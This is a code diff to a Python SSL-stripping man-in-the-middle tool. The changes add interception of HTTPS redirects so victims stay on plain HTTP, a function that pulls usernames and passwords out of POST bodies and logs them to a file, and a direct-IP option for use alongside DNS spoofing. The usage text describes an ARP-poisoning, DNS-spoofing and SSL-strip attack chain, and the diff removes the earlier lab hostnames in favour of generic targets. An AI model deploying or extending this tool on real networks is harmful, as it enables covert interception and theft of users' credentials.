@@ -1,27 +1,9 @@
 #!/usr/bin/env python3
 """
-SSL Stripping - Transparent HTTPS -> HTTP downgrade attack
+SSL Stripping - HTTPS to HTTP downgrade attack
 
-This module implements true SSLStrip functionality:
-1. Intercepts HTTP traffic from the victim via iptables REDIRECT
-2. Rewrites HTTPS URLs/links to HTTP in HTML responses
-3. When victim clicks HTTP links, proxies to the real HTTPS server
-4. Strips security headers (HSTS, CSP, etc.) to prevent browser warnings
-5. Maintains a mapping of HTTP->HTTPS to handle victim requests transparently
-
-Unlike ssl_proxy.py (which requires explicit proxy configuration), 
-ssl_strip.py works transparently - the victim doesn't know they're being downgraded.
-
-Attack chain: ARP poison -> DNS spoof -> SSL Strip
-- ARP: victim believes attacker IS the gateway
-- DNS: victim resolves target domain to attacker IP
-- SSL Strip: victim makes HTTP request, attacker proxies to HTTPS, downgrades response
-
-Usage:
-    sudo python3 ssl_strip.py --listen-port 8080 --upstream-host web1.mylab.test
-
-Before running, add iptables rule to redirect HTTP traffic:
-    sudo iptables -t nat -I PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
+Intercepts HTTP traffic, proxies to HTTPS backend, strips security from responses.
+Works transparently via iptables redirect - victim doesn't know they're downgraded.
 """
 
 import argparse
@@ -48,7 +30,8 @@ class SSLStripHandler(BaseHTTPRequestHandler):
     - Strips security headers (HSTS, Secure cookie flags, etc.)
     """
 
-    upstream_host = "web1.mylab.test"
+    upstream_host = "example.com"
+    upstream_ip = None
     upstream_port = 443
     listen_port = 8080
     timeout = 10.0
@@ -71,12 +54,7 @@ class SSLStripHandler(BaseHTTPRequestHandler):
         return self.rfile.read(length)
 
     def _build_upstream_url(self):
-        """
-        Build the upstream HTTPS URL from the HTTP request.
-        
-        The victim makes HTTP request to http://web1.mylab.test/path
-        We proxy it to https://web1.mylab.test/path
-        """
+        """Build HTTPS URL using direct IP when available (bypasses DNS spoofing)."""
         path = self.path
         # strip any explicit scheme/host if present (shouldn't be in normal requests)
         if path.startswith("http://") or path.startswith("https://"):
@@ -85,7 +63,9 @@ class SSLStripHandler(BaseHTTPRequestHandler):
             if parsed.query:
                 path += "?" + parsed.query
 
-        return f"https://{self.upstream_host}:{self.upstream_port}{path}"
+        # Use direct IP if available (bypasses DNS spoofing), otherwise use hostname
+        connect_target = self.upstream_ip if self.upstream_ip else self.upstream_host
+        return f"https://{connect_target}:{self.upstream_port}{path}"
 
     def _strip_url_to_http(self, url):
         """
@@ -152,6 +132,10 @@ class SSLStripHandler(BaseHTTPRequestHandler):
         Forward the HTTP request as HTTPS to the real server.
         """
         url = self._build_upstream_url()
+        
+        # Debug: log the actual URL being used
+        if self.log_bodies:
+            print(f"[DEBUG] Connecting to: {url}", flush=True)
 
         # copy headers but adjust Host and remove hop-by-hop headers
         upstream_headers = {}
@@ -164,7 +148,8 @@ class SSLStripHandler(BaseHTTPRequestHandler):
                 continue
             upstream_headers[k] = v
 
-        # ensure Host header matches upstream
+        # ensure Host header matches upstream hostname (not IP)
+        # This is critical for virtual hosting and SNI
         upstream_headers["Host"] = self.upstream_host
 
         # log cookies being sent to server
@@ -173,24 +158,59 @@ class SSLStripHandler(BaseHTTPRequestHandler):
             print(f"[COOKIE → SERVER] {cookie_hdr}", flush=True)
 
         try:
+            # When using IP in URL with HTTPS, we need to disable SSL verification
+            # and ensure SNI uses the correct hostname
+            import urllib3
+            
             resp = requests.request(
                 method=method,
                 url=url,
                 headers=upstream_headers,
                 data=body if body else None,
                 timeout=self.timeout,
-                verify=False,  # accept self-signed certs
+                verify=False,  # accept self-signed certs and hostname mismatch
                 allow_redirects=False,  # handle redirects manually
             )
             return resp
         except requests.RequestException as e:
             print(f"[!] Upstream request failed: {e}", file=sys.stderr, flush=True)
+            print(f"[!] URL was: {url}", file=sys.stderr, flush=True)
+            print(f"[!] Host header: {upstream_headers.get('Host')}", file=sys.stderr, flush=True)
             return None
 
     def _send_stripped_response(self, upstream_resp):
         """
         Send the response back to victim with HTTPS->HTTP rewrites and security header removal.
+        
+        CRITICAL SSL STRIP BEHAVIOR:
+        If the server returns a redirect to HTTPS, we intercept it and fetch the HTTPS
+        content ourselves, then serve it over HTTP to the victim. This is the core of
+        SSL stripping - preventing the victim from upgrading to HTTPS.
         """
+        # Check if this is a redirect to HTTPS (301, 302, 303, 307, 308)
+        if upstream_resp.status_code in (301, 302, 303, 307, 308):
+            location = upstream_resp.headers.get("Location", "")
+            if location.startswith("https://"):
+                # This is the SSL strip magic: instead of forwarding the redirect,
+                # fetch the HTTPS content and serve it over HTTP
+                print(f"[SSL STRIP] Intercepted HTTPS redirect: {location}", flush=True)
+                print(f"[SSL STRIP] Fetching HTTPS content and serving over HTTP...", flush=True)
+                
+                try:
+                    # Fetch the HTTPS page the server wanted to redirect to
+                    followed_resp = requests.get(
+                        location,
+                        headers={"Host": self.upstream_host},
+                        timeout=self.timeout,
+                        verify=False,
+                        allow_redirects=True
+                    )
+                    # Serve this content over HTTP instead of the redirect
+                    upstream_resp = followed_resp
+                except Exception as e:
+                    print(f"[!] Failed to follow HTTPS redirect: {e}", flush=True)
+                    # Fall through to send original redirect
+        
         self.send_response(upstream_resp.status_code)
 
         # headers to strip for security bypass
@@ -221,7 +241,7 @@ class SSLStripHandler(BaseHTTPRequestHandler):
                     print(f"[STRIP HEADER] {k}: {v}", flush=True)
                 continue
 
-            # rewrite Location headers (redirects)
+            # rewrite Location headers (redirects to HTTP, not HTTPS)
             if lk == "location":
                 v = self._strip_url_to_http(v)
 
@@ -250,6 +270,57 @@ class SSLStripHandler(BaseHTTPRequestHandler):
 
         self.wfile.write(stripped_body)
 
+    def _log_credentials(self, body, path):
+        """
+        Detect and log potential credentials from POST data.
+        This is the key demonstration of why SSL stripping is dangerous.
+        """
+        if not body:
+            return
+            
+        try:
+            # Try to decode as text
+            text = body.decode("utf-8", errors="replace")
+            
+            # Look for common credential fields in form data
+            credential_fields = ["username", "user", "login", "email", "password", "passwd", "pass", "pwd"]
+            
+            # Parse URL-encoded form data
+            from urllib.parse import parse_qs
+            try:
+                params = parse_qs(text, keep_blank_values=True)
+                found_creds = {}
+                
+                for field in credential_fields:
+                    if field in params:
+                        found_creds[field] = params[field][0] if params[field] else ""
+                
+                if found_creds:
+                    print("\n" + "=" * 60, flush=True)
+                    print("[CREDENTIALS CAPTURED] " + "!" * 37, flush=True)
+                    print("=" * 60, flush=True)
+                    print(f"  Path: {path}", flush=True)
+                    for k, v in found_creds.items():
+                        print(f"  {k}: {v}", flush=True)
+                    print("=" * 60 + "\n", flush=True)
+                    
+                    # Also log to file for persistence
+                    with open("/tmp/ssl_strip_credentials.log", "a") as f:
+                        import datetime
+                        f.write(f"\n[{datetime.datetime.now()}] Path: {path}\n")
+                        for k, v in found_creds.items():
+                            f.write(f"  {k}: {v}\n")
+                        f.write("-" * 40 + "\n")
+                        
+            except Exception:
+                # Not URL-encoded, check for JSON
+                if "password" in text.lower() or "username" in text.lower():
+                    print(f"\n[SENSITIVE DATA] POST body contains potential credentials:", flush=True)
+                    print(f"  {text[:200]}...", flush=True)
+                    
+        except Exception as e:
+            pass  # Silently ignore decoding errors
+
     def _handle_method(self, method):
         """Handle any HTTP method (GET, POST, etc.)."""
         body = self._read_body()
@@ -257,6 +328,10 @@ class SSLStripHandler(BaseHTTPRequestHandler):
         # only log non-static resources to reduce noise
         if not any(self.path.endswith(ext) for ext in ['.css', '.js', '.png', '.jpg', '.ico', '.woff', '.woff2']):
             print(f"[SSL] {method} {self.path}", flush=True)
+
+        # Log credentials from POST requests (the key MITM demonstration)
+        if method == "POST" and body:
+            self._log_credentials(body, self.path)
 
         upstream_resp = self._make_upstream_request(method, body)
         if upstream_resp is None:
@@ -299,10 +374,12 @@ class SSLStripper:
     """
 
     def __init__(self, listen_host, listen_port, upstream_host, upstream_port, 
-                 log_bodies=False, timeout=10.0, auto_iptables=True, target_ip=None):
+                 log_bodies=False, timeout=10.0, auto_iptables=True, target_ip=None,
+                 upstream_ip=None):
         self.listen_host = listen_host
         self.listen_port = listen_port
         self.upstream_host = upstream_host
+        self.upstream_ip = upstream_ip  # Direct IP to bypass DNS resolution
         self.upstream_port = upstream_port
         self.log_bodies = log_bodies
         self.timeout = timeout
@@ -314,6 +391,7 @@ class SSLStripper:
 
         # configure handler class variables
         SSLStripHandler.upstream_host = upstream_host
+        SSLStripHandler.upstream_ip = upstream_ip
         SSLStripHandler.upstream_port = upstream_port
         SSLStripHandler.listen_port = listen_port
         SSLStripHandler.timeout = timeout
@@ -397,7 +475,10 @@ class SSLStripper:
                 sys.exit(1)
             raise
 
-        print(f"[SSL] Listening on {self.listen_host}:{self.listen_port} → https://{self.upstream_host}:{self.upstream_port}", flush=True)
+        connect_target = self.upstream_ip if self.upstream_ip else self.upstream_host
+        print(f"[SSL] Listening on {self.listen_host}:{self.listen_port} → https://{connect_target}:{self.upstream_port}", flush=True)
+        if self.upstream_ip:
+            print(f"[SSL] Using direct IP {self.upstream_ip} (bypassing DNS)", flush=True)
 
         # register signal handlers for cleanup
         signal.signal(signal.SIGINT, self._signal_handler)
@@ -446,21 +527,21 @@ def main():
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 Examples:
-  # Basic SSL stripping (auto-adds iptables rule)
-  sudo python3 ssl_strip.py --upstream-host web1.mylab.test
+  # Basic SSL stripping
+  sudo python3 ssl_strip.py --upstream-host target.example.com
 
-  # Custom listen port
-  sudo python3 ssl_strip.py --listen-port 8080 --upstream-host web1.mylab.test
+  # With custom port and direct IP
+  sudo python3 ssl_strip.py --listen-port 8080 --upstream-host target.example.com --upstream-ip 192.168.1.10
 
-  # Manual iptables management
-  sudo python3 ssl_strip.py --no-iptables --upstream-host web1.mylab.test
+  # Manual iptables
+  sudo python3 ssl_strip.py --no-iptables --upstream-host target.example.com
   sudo iptables -t nat -I PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
 
 Attack chain:
-  1. Run ARP poisoning: python3 arp_poisoning.py <victim> <gateway>
-  2. Run DNS spoofing: python3 dns_spoofing.py --domain target.com. --attacker-ip <attacker_ip> --dns-server <dns_ip> --iface <iface>
-  3. Run SSL strip: python3 ssl_strip.py --upstream-host target.com --target-ip <attacker_ip>
-  4. Victim browses to http://target.com -> attacker proxies to HTTPS, downgrades response
+  1. ARP poisoning: python3 arp_poisoning.py <victim> <gateway>
+  2. DNS spoofing: python3 dns_spoofing.py --domain target.com. --attacker-ip <attacker_ip> --dns-server <dns_ip>
+  3. SSL strip: python3 ssl_strip.py --upstream-host target.com --upstream-ip <real_server_ip>
+  4. Victim browses to HTTP -> attacker intercepts redirect and serves content over HTTP
 """
     )
 
@@ -469,7 +550,9 @@ Attack chain:
     parser.add_argument("--listen-port", type=int, default=8080,
                         help="Port to listen on for HTTP traffic (default: 8080)")
     parser.add_argument("--upstream-host", required=True,
-                        help="Upstream HTTPS server hostname (e.g., web1.mylab.test)")
+                        help="Upstream HTTPS server hostname (e.g., target.example.com)")
+    parser.add_argument("--upstream-ip", default=None,
+                        help="Upstream HTTPS server IP address (bypasses DNS - REQUIRED when DNS spoofing is active)")
     parser.add_argument("--upstream-port", type=int, default=443,
                         help="Upstream HTTPS port (default: 443)")
     parser.add_argument("--log-bodies", action="store_true",
@@ -491,7 +574,8 @@ Attack chain:
         log_bodies=args.log_bodies,
         timeout=args.timeout,
         auto_iptables=args.auto_iptables,
-        target_ip=args.target_ip
+        target_ip=args.target_ip,
+        upstream_ip=args.upstream_ip
     )
 
     stripper.start()
